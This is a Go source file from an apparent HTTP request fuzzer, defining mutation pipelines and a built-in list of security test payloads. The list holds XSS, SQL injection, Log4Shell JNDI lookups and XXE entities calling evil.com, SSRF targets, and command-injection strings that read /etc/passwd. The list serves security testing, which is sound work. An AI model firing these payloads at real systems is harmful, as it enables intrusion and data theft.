// Package mutate implements mutation strategies for HTTP requests including
// URI, header, JSON body, param, and sequence-level mutations.
package mutate

import (
	"encoding/base64"
	"math/rand"
	"strings"

	"ffuuzz/internal/model"
)

// fuzzStrings are common security-relevant payloads used by multiple mutators
// (json:string_mutation and param:string_mutation) to inject into string values.
// Each category includes grammar-breaking prefixes that close the current syntactic
// context (string, tag, attribute, expression) before injecting the payload.
var fuzzStrings = []string{
	// --- Empty / overflow ---
	"",
	strings.Repeat("A", 1024),
	strings.Repeat("A", 65536),
	"\x00\x01\x02\x03",

	// --- XSS / HTML injection ---
	// Close-tag + open-new vectors (grammar break: ">)
	`"><script>alert(1)</script>`,
	`"><img src=x onerror=alert(1)>`,
	`"><svg onload=alert(1)>`,
	// Close JS expression (grammar break: '-)
	`'-alert(1)-'`,
	// Close attribute + event handler (grammar break: ' on / " a)
	`' onmouseover=alert(1)//`,
	`" autofocus onfocus=alert(1)//`,
	// Close script block + reopen (grammar break: </)
	`</script><script>alert(1)</script>`,
	// JS pseudo-URL prefix (grammar break: javascript:)
	`javascript:alert(1)`,
	// Vanilla script tag
	"<script>alert(1)</script>",

	// --- SQL injection ---
	// Single-quote break (grammar break: ')
	"' OR '1'='1",
	"' OR 1=1--",
	"admin'--",
	"' OR SLEEP(10)--",
	"' UNION SELECT 1,2,3--",
	"' AND 1=1--",
	"' AND 1=0--",
	// Double-quote break (grammar break: ")
	`" OR 1=1--`,
	`" OR "1"="1`,
	// Close parens variants (grammar break: ) / '))
	"') OR 1=1--",
	`") OR 1=1--`,
	"')) OR 1=1--",
	`")) OR 1=1--`,
	// Numeric context (grammar break: starts with number, then boolean)
	"1 OR 1=1--",
	// Stacked queries (grammar break: ; after closing)
	"';EXEC xp_cmdshell('ping 127.0.0.1')--",
	"');WAITFOR DELAY '0:0:10'--",

	// --- LDAP / Log4Shell ---
	"${jndi:ldap://evil.com/a}",
	"${jndi:rmi://evil.com/a}",
	"${jndi:dns://evil.com/a}",

	// --- Template injection (SSTI) ---
	"{{7*7}}",    // Jinja2/Mustache/Handlebars
	"${7*7}",     // Freemarker/Velocity/Spring EL
	"#{7*7}",     // Ruby string interpolation
	"<%= 7*7 %>", // ERB/EJS

	// --- Path traversal ---
	"../../../etc/passwd",
	"..\\..\\..\\windows\\win.ini",
	// Null-byte termination + traversal (grammar break: %00)
	"%00../../../etc/passwd",

	// --- Header injection / response splitting ---
	"\r\nX-Injected: true",
	// URL-encoded CRLF prefix (grammar break: %0d%0a)
	"%0d%0aX-Injected:%20true",

	// --- Unicode attacks ---
	"\u0000",
	"\uFFFD",
	strings.Repeat("\u202E", 100),

	// --- XXE (XML External Entity) ---
	`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
	`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd"> %xxe;]>`,
	`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>`,

	// --- SSRF (Server-Side Request Forgery) ---
	"http://169.254.169.254/latest/meta-data/",
	"http://127.0.0.1:6379/",
	"http://[::1]:22/",
	"file:///etc/passwd",
	"gopher://127.0.0.1:6379/_INFO",

	// --- Command injection ---
	// Backtick substitution (grammar break: `)
	"`id`",
	// Command substitution (grammar break: $()
	"$(whoami)",
	// Newline injection (grammar break: \n / %0a)
	"\nid\n",
	"%0a id",
	// Semicolon (grammar break: ;)
	"; ls -la /",
	"; /usr/bin/id",
	// Pipe (grammar break: |)
	"| cat /etc/passwd",
	"| sleep 10",
	// Double ampersand (grammar break: &&)
	"&& id",
	"&& sleep 10",
	// Double pipe (grammar break: ||)
	"|| id",
	"|| sleep 10",
	// Close string then inject (grammar break: ' + ; or " + ;)
	"';id",
	"');id",
	`");id`,
	// Ampersand (grammar break: &)
	"& ping -c 10 127.0.0.1 &",
	// Blind sleep
	"$(sleep 10)",

	// --- Full-path command variants ---
	"/usr/bin/id",
	"%0a/usr/bin/id",
	"%0a/bin/ls -la",

	// --- Prototype pollution ---
	"__proto__",
	"constructor",
	`{"__proto__":{"isAdmin":true}}`,
	`constructor[prototype][isAdmin]=true`,
	`{"constructor":{"prototype":{"isAdmin":true}}}`, // nested JSON variant
}

// MutationResult holds the output of a mutation operation.
type MutationResult struct {
	Exchange  model.Exchange
	Operators []string // names of applied mutation operators for reproducibility
	Seed      int64    // RNG seed used
}

// SequenceMutationResult holds the output of a sequence mutation.
type SequenceMutationResult struct {
	Exchanges []model.Exchange
	Operators []string
	Seed      int64
}

// ExchangeMutator mutates a single Exchange.
type ExchangeMutator interface {
	Mutate(ex model.Exchange, rng *rand.Rand, intensity float64) MutationResult
}

// SequenceMutator mutates a sequence of Exchanges.
type SequenceMutator interface {
	Mutate(exs []model.Exchange, rng *rand.Rand, intensity float64) SequenceMutationResult
}

// ExchangeMutatorFunc adapts a function to the ExchangeMutator interface.
type ExchangeMutatorFunc func(ex model.Exchange, rng *rand.Rand, intensity float64) MutationResult

func (f ExchangeMutatorFunc) Mutate(ex model.Exchange, rng *rand.Rand, intensity float64) MutationResult {
	return f(ex, rng, intensity)
}

// Config controls which mutation classes are enabled and their parameters.
// EnabledOps controls per-category operator selection. If a category's slice is
// nil or empty, all operators in that category are enabled.
type Config struct {
	PathQuery           bool
	Headers             bool
	JSONBody            bool
	Params              bool
	Sequence            bool
	Intensity           float64
	MaxURLLen           int
	MaxHdrLen           int
	MaxBodyLen          int
	UserDictionary      *Dictionary // header dictionary (nil = built-in only)
	UserDictionaryPaths []string    // paths to dictionary files to load

	// Per-category operator filters.
	URIEnabledOps       []string
	HeaderEnabledOps    []string
	JSONEnabledOps      []string
	ParamEnabledOps     []string
	PrimitiveEnabledOps []string
	SequenceEnabledOps  []string
}

// DefaultConfig returns sensible defaults for mutation configuration.
func DefaultConfig() Config {
	return Config{
		PathQuery:  true,
		Headers:    true,
		JSONBody:   true,
		Params:     true,
		Sequence:   true,
		Intensity:  0.5,
		MaxURLLen:  8192,
		MaxHdrLen:  8192,
		MaxBodyLen: 1 << 20, // 1MB
	}
}

// Pipeline composes multiple ExchangeMutators into a single mutator that applies
// enabled mutation classes in sequence based on the config.
type Pipeline struct {
	cfg           Config
	primitive     *PrimitiveMutator
	uri           *URIMutator
	header        *HeaderMutator
	jsonM         *JSONMutator
	param         *ParamMutator
	intensityFunc func(operatorPrefix string) float64 // optional: adaptive intensity
}

// NewPipeline creates a Pipeline from config.
func NewPipeline(cfg Config) *Pipeline {
	dict := cfg.UserDictionary
	// Load dictionary files if configured and no explicit dictionary provided
	if dict == nil && len(cfg.UserDictionaryPaths) > 0 {
		d := LoadFromFiles(cfg.UserDictionaryPaths)
		dict = d
	}
	return &Pipeline{
		cfg:       cfg,
		primitive: &PrimitiveMutator{EnabledOps: filterOperators(cfg.PrimitiveEnabledOps, allPrimitiveOps)},
		uri:       &URIMutator{MaxURLLen: cfg.MaxURLLen, EnabledOps: filterOperators(cfg.URIEnabledOps, allURIOps)},
		header:    &HeaderMutator{MaxHdrLen: cfg.MaxHdrLen, UserDict: dict, EnabledOps: filterOperators(cfg.HeaderEnabledOps, allHeaderOps)},
		jsonM:     &JSONMutator{MaxBodyLen: cfg.MaxBodyLen, EnabledOps: filterOperators(cfg.JSONEnabledOps, allJSONOps)},
		param:     &ParamMutator{EnabledOps: filterOperators(cfg.ParamEnabledOps, allParamOps)},
	}
}

// All known operator names per mutator category (without the category prefix).
var (
	allURIOps       = []string{"path_segment", "query_param", "reserved_inject", "percent_encoding", "slash_manipulation", "long_value"}
	allHeaderOps    = []string{"add", "remove", "duplicate", "long_value", "dict_substitute", "conflicting"}
	allJSONOps      = []string{"type_substitute", "object_key", "array_mutation", "boundary_values", "depth_stress", "string_mutation"}
	allParamOps     = []string{"string_mutation"}
	allPrimitiveOps = []string{"bitflip", "byteflip", "arith", "interesting", "block_op", "splice"}
)

// AllSeqOps is the exported list of all sequence operator names (without "seq:" prefix).
var AllSeqOps = []string{"drop", "duplicate", "swap", "perstep"}

// FilterOperators is the exported version of filterOperators for use by callers
// outside the mutate package (e.g. engine).
func FilterOperators(enabled []string, allOps []string) []string {
	return filterOperators(enabled, allOps)
}

// resolveOps returns the effective operator list for a mutator.
// nil means all operators are enabled (default behavior).
// non-nil empty means no operators are enabled (explicitly filtered to none).
func resolveOps(configured []string, all []string) []string {
	if configured == nil {
		return all
	}
	return configured
}

// filterOperators returns the subset of allOps that are listed in enabled.
// If enabled is nil or empty, returns allOps (backward compatible: all enabled).
// If none of the enabled names match any known operator, falls back to allOps.
func filterOperators(enabled []string, allOps []string) []string {
	if len(enabled) == 0 {
		return allOps
	}
	allowed := make(map[string]bool, len(enabled))
	for _, op := range enabled {
		allowed[op] = true
	}
	result := make([]string, 0, len(enabled))
	for _, op := range allOps {
		if allowed[op] {
			result = append(result, op)
		}
	}
	if len(result) == 0 {
		return allOps
	}
	return result
}

// Intensity returns the configured mutation intensity.
func (p *Pipeline) Intensity() float64 {
	return p.cfg.Intensity
}

// Dict returns the user dictionary, or nil if none is configured.
func (p *Pipeline) Dict() *Dictionary {
	return p.header.UserDict
}

// SetIntensityCallback configures dynamic per-operator intensity for adaptive fuzzing.
// When set, the effective probability for each operator is intensity * fn(prefix).
// When nil (default), uses static intensity.
func (p *Pipeline) SetIntensityCallback(fn func(operatorPrefix string) float64) {
	p.intensityFunc = fn
}

// Mutate applies enabled mutation operators to an exchange.
func (p *Pipeline) Mutate(ex model.Exchange, rng *rand.Rand, intensity float64) MutationResult {
	var ops []string
	result := ex

	uriMult, hdrMult, jsonMult, paramMult := 1.0, 1.0, 1.0, 1.0
	if p.intensityFunc != nil {
		uriMult = p.intensityFunc("uri")
		hdrMult = p.intensityFunc("header")
		jsonMult = p.intensityFunc("json")
		paramMult = p.intensityFunc("param")
	}

	if p.cfg.PathQuery && rng.Float64() < intensity*uriMult {
		r := p.uri.Mutate(result, rng, intensity)
		result = r.Exchange
		ops = append(ops, r.Operators...)
	}

	if p.cfg.Headers && rng.Float64() < intensity*hdrMult {
		r := p.header.Mutate(result, rng, intensity)
		result = r.Exchange
		ops = append(ops, r.Operators...)
	}

	if p.cfg.JSONBody && rng.Float64() < intensity*jsonMult {
		r := p.jsonM.Mutate(result, rng, intensity)
		result = r.Exchange
		ops = append(ops, r.Operators...)
	}

	if p.cfg.Params && rng.Float64() < intensity*paramMult {
		r := p.param.Mutate(result, rng, intensity)
		result = r.Exchange
		ops = append(ops, r.Operators...)
	}

	// If nothing was applied, at least apply a primitive mutation to the body
	if len(ops) == 0 {
		r := p.primitive.Mutate(result, rng, intensity)
		result = r.Exchange
		ops = append(ops, r.Operators...)
	}

	// Post-mutation size guards
	result = p.enforceSizeLimits(result)

	return MutationResult{Exchange: result, Operators: ops}
}

// enforceSizeLimits truncates URL, headers, and body that exceed configured maximums.
func (p *Pipeline) enforceSizeLimits(ex model.Exchange) model.Exchange {
	maxURL := p.cfg.MaxURLLen
	if maxURL <= 0 {
		maxURL = 8192
	}
	maxHdr := p.cfg.MaxHdrLen
	if maxHdr <= 0 {
		maxHdr = 8192
	}
	maxBody := p.cfg.MaxBodyLen
	if maxBody <= 0 {
		maxBody = 1 << 20
	}

	// Truncate path+query combined length
	combined := ex.Request.Path
	if ex.Request.Query != "" {
		combined += "?" + ex.Request.Query
	}
	if len(combined) > maxURL {
		if len(ex.Request.Path) > maxURL {
			ex.Request.Path = ex.Request.Path[:maxURL]
			ex.Request.Query = ""
		} else {
			remaining := maxURL - len(ex.Request.Path) - 1 // -1 for "?"
			if remaining > 0 && len(ex.Request.Query) > remaining {
				ex.Request.Query = ex.Request.Query[:remaining]
			} else if remaining <= 0 {
				ex.Request.Query = ""
			}
		}
	}

	// Truncate header values
	for k, vals := range ex.Request.Headers {
		for i, v := range vals {
			if len(v) > maxHdr {
				vals[i] = v[:maxHdr]
			}
		}
		ex.Request.Headers[k] = vals
	}

	// Truncate body (base64-encoded)
	if ex.Request.BodyB64 != "" {
		bodyBytes, err := base64.StdEncoding.DecodeString(ex.Request.BodyB64)
		if err == nil && len(bodyBytes) > maxBody {
			bodyBytes = bodyBytes[:maxBody]
			ex.Request.BodyB64 = base64.StdEncoding.EncodeToString(bodyBytes)
			ex.Request.BodyTruncated = true
		}
	}

	return ex
}

// mapKeys returns the keys of a map[string][]string (e.g. http.Header, url.Values).
func mapKeys(m map[string][]string) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

// enforceSizeLimits applies configured maximum lengths to the mutated exchange
